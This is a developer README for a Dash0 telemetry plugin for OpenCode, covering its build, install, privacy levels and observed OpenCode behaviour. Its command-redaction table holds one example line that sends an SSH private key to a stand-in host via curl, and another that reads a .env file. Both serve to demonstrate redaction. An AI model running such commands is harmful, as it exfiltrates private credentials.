# Dash0 OpenCode plugin

Sends OpenTelemetry traces for OpenCode sessions to Dash0.

This is the developer reference: how the plugin is put together, how to sideload
local changes, and what was observed about OpenCode itself. End users install it
with `install-opencode.sh` or the npm package; both are described under
[Install layout](#install-layout).

## The plugin package

`src/` is the TypeScript plugin OpenCode loads in process. It filters the event
bus, wraps each surviving event in the envelope
`internal/source/opencode.Normalize` documents, and writes it to the stdin of
`opencode-on-event.sh`. It parses no config, resolves no secrets, and
constructs no spans.

| Path | What it is |
|---|---|
| `src/index.ts` | The hooks, the wrapper lookup, and the toast. |
| `src/translate.ts` | The filter, the root-session resolution, the call-id dedupe, and the per-turn usage accumulator. |
| `src/spawn.ts` | One wrapper process per event, never awaited. |
| `build.sh` | Bundles `dist/dash0-opencode-plugin.js` and fails if the bundle imports anything outside the Node builtins. |

```sh
./build.sh                     # bundle (bun, or npx esbuild)
node --test 'test/*.test.ts'   # unit tests, also wired into `make test`
npm install && npm run typecheck
```

The tests are TypeScript run through Node's type stripping, so they need Node
22.18 or newer and no install step. `npm install` is only needed to typecheck
against the real `@opencode-ai/plugin` types.

### Spawn ordering

The plugin runs the wrappers one after another through an in-plugin promise
chain. No hook handler ever awaits that chain, so OpenCode is never blocked;
the queue only orders the child processes against each other.

This is not in the change's design, which says only "fire and forget". It is
needed because the pipeline is order-sensitive in both directions: `Stop`
clears the turn's trace context, so a tool event that arrives after it is
dropped, and `SubagentStart` snapshots that context, so it has to land while it
is live. Concurrent processes give no such guarantee.

It is observable. The scripted session below exports 6 spans with the queue and
7 without it: unordered, `SessionEnd` reached the pipeline before `Stop` and
produced the spurious `StopFailure` chat span that `pipeline.Process` emits for
a trace context that is still live.

`dispose` waits up to 2 seconds for the queue to drain before it sends
`SessionEnd`, so a hung wrapper delays shutdown by that much and no more.

### Finding the wrapper

The plugin tries `$DASH0_OPENCODE_ON_EVENT`, then `opencode-on-event.sh` beside
the bundle, then one directory up, then
`~/.config/opencode/dash0-agent-plugin/opencode-on-event.sh`. With none of them
present the plugin loads and does nothing, which is the fail-open case for a
half-finished install.

### User notification

The plugin toasts every stderr line the wrapper emits that starts with
`dash0: `, which is the prefix `pipeline.Process` puts on its user-facing
messages, with one exception: `dash0: telemetry is not active` is dropped, since
the spec requires that an unconfigured session show no notification at all. The
wrapper's own diagnostics are prefixed `opencode-on-event:` and are never
toasted.

Only the `SessionStart` spawn reads the child's stderr at all; every other
spawn discards it, so the notification path costs one pipe per session.

## Supported OpenCode versions

**1.18.0 and newer.** That is what `peerDependencies` declares (`>=1.18.0 <2`)
and what the devDependency pins.

The floor is a behavioural claim, not a type one. Everything under [Observed
OpenCode behavior](#observed-opencode-behavior) was recorded against 1.18.0, and
the mapping depends on those observations: that `session.idle` fires for child
sessions, that a terminal tool part arrives once per call id, that an MCP tool is
named after its config key. The types cannot stand in for that check — `tsc
--noEmit` passes against `@opencode-ai/plugin` as far back as 1.0.0, because the
translator reads the bus payloads as `Record<string, unknown>` rather than
through the published types.

1.18.28, the newest release at the time of writing, typechecks. Re-run the
capture harness on a major upgrade rather than trusting that it still does.

## Install layout

`install-opencode.sh` lays down four files and a binary:

```
~/.config/opencode/plugin/dash0-opencode-plugin.js     the bundle OpenCode loads
~/.config/opencode/plugin/opencode-on-event.sh         the wrapper the plugin spawns
~/.config/opencode/dash0-agent-plugin.local.md         config (chmod 600)
~/.config/opencode/opencode.json                       written only when absent, and empty
~/.local/state/dash0-agent-plugin/opencode/bin/…       the binary, pre-downloaded
```

Everything in `~/.config/opencode/plugin/` is loaded automatically, so there is
no registration step and no trust prompt. The wrapper sits beside the bundle
because that is the first place the plugin looks for it. The empty
`opencode.json` exists only so a first-time user has a file to edit; an existing
one is never touched, since the plugin needs no entry in it.

OpenCode's docs name the global plugin directory `plugins/`, plural. Both
spellings are scanned: a marker plugin dropped in `plugin/` and one in
`plugins/` both loaded on 1.18.20. The installer writes the singular one, which
is also where the plugin looks for its wrapper.

The npm path is the other way in:

```bash
opencode plugin @dash0/opencode-plugin --global
```

That resolves the package, adds it to `opencode.json`'s `plugin` array and
caches it under `~/.cache/opencode/node_modules/`. Same two files, out of the
package instead of the plugin directory. The entry it writes carries no version,
so OpenCode resolves the newest on every start; the release workflow refuses to
publish a package whose version does not match the release, so the wrapper in it
always asks for a binary that exists. Pin a different one with `DASH0_VERSION`.

`DASH0_VERSION` pins a release. The installer reads it when resolving what to
download, and `opencode-on-event.sh` reads it at runtime to override the version
it was installed with.

## Build & run locally

Sideloads a locally-built binary and bundle instead of downloading a release.
`test/live/opencode/session.sh` does exactly this in a sandbox; the steps below
are the same thing against your real `~/.config/opencode`.

**1. Build the bundle and the binary:**

```bash
./build.sh                                    # → opencode/dist/dash0-opencode-plugin.js
VERSION=$(grep '^VERSION=' opencode-on-event.sh | cut -d'"' -f2)
OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/')
BIN_DIR="$HOME/.local/state/dash0-agent-plugin/opencode/bin"
mkdir -p "$BIN_DIR"
go build -o "$BIN_DIR/opencode-on-event-${VERSION}-${OS}-${ARCH}" ../cmd/opencode-on-event
```

The wrapper re-verifies a cached binary's checksum on every run, but only
against a digest file it wrote itself at download time. A hand-built binary has
none, so the check is skipped rather than failed.

`build.sh` bundles with `bun` when it is installed and `npx esbuild` otherwise,
and the two write different bytes for the same source. Bun also stamps each
module's path relative to the working directory, so building from the repo root
(which is what the release does, through the goreleaser `before` hook) and
building from `opencode/` differ too. Each is reproducible on its own terms and
the release checksums whatever it built, so nothing breaks. It does mean a local
bundle will not match a release digest unless you match the bundler and the
directory.

**2. Copy both files into the plugin directory:**

```bash
mkdir -p ~/.config/opencode/plugin
cp dist/dash0-opencode-plugin.js ~/.config/opencode/plugin/
cp opencode-on-event.sh ~/.config/opencode/plugin/
chmod +x ~/.config/opencode/plugin/opencode-on-event.sh
```

Copy rather than symlink: the plugin resolves the wrapper relative to its own
file, and a symlinked bundle resolves against the link's target, which is the
repo rather than the plugin directory. To point at a wrapper somewhere else
entirely, set `$DASH0_OPENCODE_ON_EVENT`.

**3. Write a config file** at `~/.config/opencode/dash0-agent-plugin.local.md`:

```yaml
---
otlp_url: "https://ingress.<region>.aws.dash0.com"
auth_token: "your-dash0-auth-token"
dataset: "default"
agent_name: "opencode"
# For local debugging — every emitted span is also appended to this file:
# debug: true
# debug_file: /tmp/dash0-opencode-debug.log
---
```

```bash
chmod 600 ~/.config/opencode/dash0-agent-plugin.local.md
```

**4. Start a session.** OpenCode loads the plugin directory at startup, so a new
`opencode` or `opencode run "…"` picks up step 2. A rebuilt binary (step 1) takes
effect on the next event with no restart, since the wrapper `exec`s a fresh one
each time. A rebuilt bundle needs a restart.

Tear the sideload down with:

```bash
rm ~/.config/opencode/plugin/dash0-opencode-plugin.js
rm ~/.config/opencode/plugin/opencode-on-event.sh
rm ~/.config/opencode/dash0-agent-plugin.local.md
rm -rf ~/.local/state/dash0-agent-plugin/opencode
```

## Verify

With `debug: true` set, every emitted span lands in the debug file as one
`[dash0:trace] {...}` line:

```bash
tail -F /tmp/dash0-opencode-debug.log
```

Run a prompt that calls at least one tool. You should see:

- one `execute_tool <name>` span per tool call
- one `chat <model>` span at turn end carrying `gen_ai.usage.input_tokens`,
  `output_tokens` and `cache_read.input_tokens`
- the same `traceId` on every span in the turn
- each tool span's `parentSpanId` matching the chat span's `spanId`

A delegated sub-task adds an `invoke_agent` span, and the sub-agent's own tool
spans parent to it rather than to the chat span. `make test-live` asserts all of
this against a scripted model; [Verifying against a live
Dash0](#verifying-against-a-live-dash0) is the same check against a real
backend.

If nothing appears at all, the ordered failures to rule out are: no config file
(the plugin loads and does nothing), no wrapper beside the bundle (same), and a
plugin directory OpenCode never scanned (restart it).

## Switch to capture mode

To collect new fixture payloads instead of emitting spans, use the capture
harness in [`test/capture/opencode/`](../test/capture/opencode/). It runs a
throwaway plugin, a mock model and a mock MCP server in a sandboxed `HOME`, and
writes `captured/` alongside the schema dump the [On-disk session
storage](#on-disk-session-storage) findings come from.

## Uninstall

```bash
./uninstall-opencode.sh --yes
```

It removes the bundle, the wrapper and the cached binaries, and leaves
`dash0-agent-plugin.local.md` in place so a reinstall does not ask for the token
again.

## Telemetry privacy

OpenCode is the only runtime that exposes the four privacy dimensions. Each one
governs a different class of content, and each is set independently to
`disabled`, `limited` or `full` in the config file — project-scoped
`.opencode/dash0-agent-plugin.local.md`, else user-scoped
`~/.config/opencode/dash0-agent-plugin.local.md`.

```yaml
---
otlp_url: "https://ingress.<region>.aws.dash0.com"
auth_token: "your-dash0-auth-token"
dataset: "default"
prompts: limited
tools: limited
skills: full
agents: limited
---
```

| Dimension | What it governs | `disabled` | `limited` | `full` |
|---|---|---|---|---|
| `prompts` | `gen_ai.input.messages`, `gen_ai.output.messages`, `gen_ai.conversation.name` on chat spans | attributes omitted | message JSON with each content `<REDACTED>`, plus `dash0.gen_ai.{input,output}.messages.withheld_characters`; `gen_ai.conversation.name` is the bare placeholder, with no envelope and no count | the text, capped at 16 KB |
| `tools` | `execute_tool` spans | no span at all | the `execute_tool` span's Required, Conditionally Required and Recommended attributes plus the derived Dash0 ones; the Opt-In `gen_ai.tool.call.arguments` and `gen_ai.tool.call.result` omitted, and a failed call's message withheld | the arguments and result too |
| `skills` | `Skill` tool calls, which `tools` would otherwise govern | no span for a skill invocation | a span naming the skill, no arguments or result | arguments and result too |
| `agents` | `invoke_agent` spans and the sub-agent's own message content | no `invoke_agent` span; the sub-agent's tool spans reparent to the delegating turn's chat span | the span with `gen_ai.agent.name`, no sub-agent content | the sub-agent's prompt and response too |

A dimension never changes another's level, except that `skills` takes precedence
over `tools` for a skill invocation — `tools: disabled, skills: limited` still
reports which skills ran, and `tools: full, skills: disabled` reports none.
Timing is never privacy: a span's start, end, status and token counts are the
same at every level of the dimension that governs its content.

An unrecognized value resolves to `limited` and is reported on stderr, so a typo
narrows what is exported rather than widening it.

### Precedence against `omit_io`

`omit_io` keeps working and keeps its default (`true`), so a config that has
never heard of the dimensions behaves exactly as before. Highest wins:

1. the dimension, set explicitly
2. `omit_io` — `true` ⇒ `prompts: limited, tools: limited`, `false` ⇒ `full` for
   both. It speaks for those two dimensions only; it never implied anything
   about skills or sub-agents, so `skills` and `agents` default to `limited`
   regardless of it.
3. the default, which is the posture `omit_io: true` produces.

So `omit_io: true` with `tools: full` exports tool arguments while prompt content
stays redacted.

### Command shapes at `tools: limited`

A bash call at `tools: limited` reports its command *shape* in
`dash0.gen_ai.tool.bash.command_family` — the binary plus the subcommand path —
and never an operand, flag, flag value, path, URL or free text.

| Command | Reported shape |
|---|---|
| `gh repo clone https://github.com/acme/private-repo` | `gh repo clone` |
| `git commit -m "fix the customer 4711 outage"` | `git commit` |
| `tools invoke dash0.getLogRecords --args='{"filter":"…"}'` | `tools invoke dash0.getLogRecords` |
| `AWS_SECRET_ACCESS_KEY=wJal git push` | `git push` |
| `git status && curl https://evil.example/$(cat ~/.ssh/id_rsa)` | `git status` |
| `cat /home/alice/.env` | `cat` |
| `pnpm deploy-customer-4711` | `pnpm` |
| `bun scripts/seed-customer-4711.ts` | `bun` |

The shape comes from the `subcommands` allowlist in `internal/pipeline` — a map
from each binary to the subcommand words it may report and, per word, how many
further tokens that word admits. `gh repo` admits one (a `gh` group is always
followed by a verb), `gh api` admits none (an endpoint path follows it), and
`tools invoke` admits one so the invoked observability tool is visible while
`--args` is not.

Extraction skips leading `KEY=value` assignments, takes the binary, then extends
only with admitted words, stopping at the first token that begins with `-`, is a
shell metacharacter, or the vocabulary does not admit. All three bounds apply;
none alone is sufficient, which is why `cat /home/alice/.env` — no dash to stop
at — still reports `cat` alone.

The table is an allowlist and fails closed both ways: an unlisted binary and an
unlisted word each report the binary alone. It covers the CLIs in the
`agents-worker` sandbox image — `curl`, `git`, `gh`, `glab`, `jq`, `rg`, `yq`,
`python3`, `pip`, `bun`, `pnpm`, `npm`, `node`, `less`, `lsof`, `ps`, `tree`,
`unzip`, `xz`, `zstd`, `opencode` — plus the `tools` CLI. Adding a binary is a
line of data; a missing one costs a subcommand, never a leak.

`bun` and `pnpm` list only their own subcommands, because the token after either
can be a script file or a package script — free text in a position that
nominally holds a subcommand.

## Observed OpenCode behavior

Findings from the capture harness in `test/capture/opencode/`, recorded against
**OpenCode 1.18.0**. The reference fixture is
`internal/source/opencode/testdata/captured_events.jsonl`. Re-run the capture
after an OpenCode upgrade — every mapping below is version-sensitive.

### Sub-agent lifecycle

`session.idle` **does** fire for child sessions. A delegated sub-task produces a
`session.created` whose `properties.info.parentID` is the parent session id, and
a matching `session.idle` for the child that arrives *before* the parent's own
`session.idle`. So `SubagentStop` maps directly to `session.idle` for any
session with a non-null `parentID`; the design's fallback (the child's last
completed assistant message) is not needed.

Delegation surfaces as an ordinary tool part with `tool: "task"`, and the child
session id is carried on `state.metadata.sessionId` (with
`state.metadata.parentSessionId` alongside it) from the `running` state onward.
This is what the plugin must use to synthesize the `tool_name: "Agent"` /
`tool_response: {"agentId": …}` event the pipeline needs in order to allocate
the sub-agent's parent span.

### MCP tool naming

OpenCode names an MCP-provided tool `<mcpServerKey>_<toolName>` — flat, with a
single underscore. A server configured under the `mcp.capture` key exposing a
tool named `echo` arrives as `capture_echo`, in both `ToolPart.tool` and the
`tool.execute.before` / `tool.execute.after` hook inputs.

The key is the **config key**, not the server's advertised `serverInfo.name`
(which was `dash0-capture-mcp` in the capture and appears nowhere in the tool
name). Since `_` is legal in both halves, the split is ambiguous in general; the
normalizer must resolve the server prefix against the configured MCP server
keys rather than splitting on the first underscore, then rewrite to the
canonical `mcp__<server>__<tool>` form that `ExtractMCPServer` and
`NormalizeMCPToolName` expect.

### Terminal tool-part updates

A terminal `message.part.updated` arrives **exactly once per `callID`**. Each
call progresses `pending` → `running` → `completed` | `error`, and in the
capture every one of the four calls had a single terminal-status event. The
`task` call emitted `running` twice (an intermediate metadata update), so
non-terminal statuses do repeat and the plugin must key deduplication on the
status, not on the part id.

One asymmetry worth noting: the `tool.execute.after` hook does **not** fire for
a failing call. `tool.execute.before` fires for all four calls but
`tool.execute.after` only for the three that completed, so `PostToolUseFailure`
has to come from the `error` part update rather than from a hook.

### On-disk session storage

Sessions, messages and parts live in a SQLite database at
`$XDG_DATA_HOME/opencode/opencode.db` (default
`~/.local/share/opencode/opencode.db`). The capture dumps the sandbox schema and
per-table row counts to `captured/storage.txt` before the sandbox is wiped, so
this is re-derivable from a run rather than from a long-lived local database.

1.18.0 writes `session`, `message` and `part`. The schema also declares a
`session_message` table — same columns as `message` plus `type` and `seq` — but
after a full capture run it holds **0 rows** while `message` holds 8 and `part`
holds 24. It is a not-yet-live successor; the `audit-usage` port must read
`message`, and must re-check this on every OpenCode upgrade because the
migration is visibly in flight.

Each `message` and `part` row keys on `id` / `session_id` and holds the full
record as JSON in a `data` column. The assistant `data` blob carries `cost`,
`modelID`, `providerID` and a `tokens` object (`total`, `input`, `output`,
`reasoning`, `cache.read`, `cache.write`). The `session` table denormalizes the
same totals into `cost` and `tokens_*` columns and carries `parent_id` for
sub-agent sessions — in the capture, the child session row's `parent_id` is the
parent session id and its token counts are its own, not the parent's.

Older OpenCode versions kept per-message JSON files under `storage/message/`.
A 1.18.0 run against a clean `XDG_DATA_HOME` writes no `storage/` directory at
all: the data dir holds only `opencode.db`, `log/` and `repos/`.

### Custom OpenAI-compatible provider

Confirmed: OpenCode accepts a custom provider declared as
`provider.<id>.options.baseURL` with a dummy `apiKey`, selected with
`opencode run --model <id>/<model>`. Pointed at a throwaway localhost server it
sends `POST /v1/chat/completions` with `Authorization: Bearer <apiKey>`
verbatim. The working declaration is in `test/capture/opencode/opencode.json`:
alongside `options`, it carries `api: "openai"` and an explicit `models` map
with a `limit`, so the model never has to be resolved against models.dev. With
that declaration OpenCode never requests `/v1/models`: the capture's request log
holds `POST /v1/chat/completions` and nothing else.

This unblocks the live-test layer; the fallback in the change's design Risks
section is not needed.

## Verifying against a live Dash0

Golden and consistency tests compare our output against our own expectations, so
they cannot catch a mapping that is wrong in both places. This is the step that
proves Dash0 received what we think we sent.

```sh
make test-live                            # against a mock collector, no credentials
test/live/opencode/dash0-session.sh       # the same session, to a real ingress
test/live/opencode/dash0-session.sh "$(printf 'omit_io: false\nomit_user_info: true')"
```

`dash0-session.sh` reads `otlp_url`, `auth_token` and `dataset` from your own
`~/.config/opencode/dash0-agent-plugin.local.md` (override with
`DASH0_LIVE_{OTLP_URL,AUTH_TOKEN,DATASET}`) and prints the session id, trace id
and time range to query back. It writes the payloads locally as well as sending
them, so what the plugin produced stays checkable independently of what the
backend stored.

Then, in the same dataset:

| Step | Query |
|---|---|
| Every span arrived | `getSpans` with `gen_ai.harness.name is opencode` and `gen_ai.conversation.id is <session id>` |
| The hierarchy is right | `getTraceDetails` on the trace id — `chat` at the root with 5 direct children and 6 descendants, one of them ERROR; `execute_tool Agent` holding the only child, `invoke_agent` |
| Usage and enrichment | `SELECT name, span_attributes['gen_ai.usage.reasoning.output_tokens'], span_attributes['dash0.gen_ai.tool.bash.command_family'], span_attributes['dash0.gen_ai.vcs.repository.name'] FROM spans WHERE span_attributes['gen_ai.conversation.id'] = '<session id>'` |
| Identity under `omit_user_info` | the same query for `user.name` (16 hex chars) and `user.email` (absent) |

The scripted turn makes exactly six model calls and the sub-agent one, and the
mock reports a flat 5 reasoning and 7 cached tokens per call — so the parent
`chat` span must read 30 and 42, and `invoke_agent` 5 and 7. Those numbers are
the cheapest way to tell a dropped step from a slow one.

### What a Claude Code session reports that this one does not

Taken from `getAttributeKeys` scoped to spans, for both harnesses in one
dataset. Nothing here is unaccounted for:

| Absent on OpenCode | Why |
|---|---|
| `gen_ai.tool.call.arguments`, `gen_ai.tool.call.result`, `exception.message` | By design. The `execute_tool` convention makes them Opt-In, so `tools: limited` omits them rather than placeholding — see [Telemetry privacy](#telemetry-privacy). They return at `tools: full`. |
| `dash0.gen_ai.code.lines_added` / `lines_removed` | Claude Code only — derived from the `structuredPatch` its hooks carry. |
| `dash0.gen_ai.usage.cost`, `billing_mode`, `plan_type`, `cache_creation.ephemeral_{5m,1h}` | Anthropic-specific billing and cache telemetry with no OpenCode equivalent. |
| `gen_ai.request.reasoning.level`, `dash0.gen_ai.request.model.original` | Claude Code puts an effort level and a pre-alias model on every payload; OpenCode reports neither. |
| `dash0.gen_ai.tool.skill.name` / `.source` | OpenCode ships skill plugins, but the scripted turn never invokes one. The `skills` dimension routes `IsSkillEvent` calls and is covered by unit tests and the contract replay — **not** yet by a real OpenCode skill call. |
| `gen_ai.provider.name` | `ProviderForModel` maps vendor model prefixes (`claude-`, `gpt-`, …). OpenCode is bring-your-own-key and its model ids are `<providerId>/<modelId>`, so a local or self-hosted model resolves to nothing. The provider id is right there in the string and could be read from it; today it is not. |

### One thing the backend does, not the plugin

At `omit_io: false` the plugin exports the real prompt, response and tool
arguments — the locally written payload shows them in full. They still read
`<REDACTED>` in Dash0: the ingest redacts `gen_ai.input.messages`,
`gen_ai.output.messages` and `gen_ai.tool.call.arguments`, and in the dev org no
span from any harness carries unredacted content. `gen_ai.conversation.name`
comes through verbatim, so the rule is per-key rather than blanket. Check this
before concluding a privacy level is not being honoured — read the payload file
`dash0-session.sh` writes, which is what the plugin actually sent.
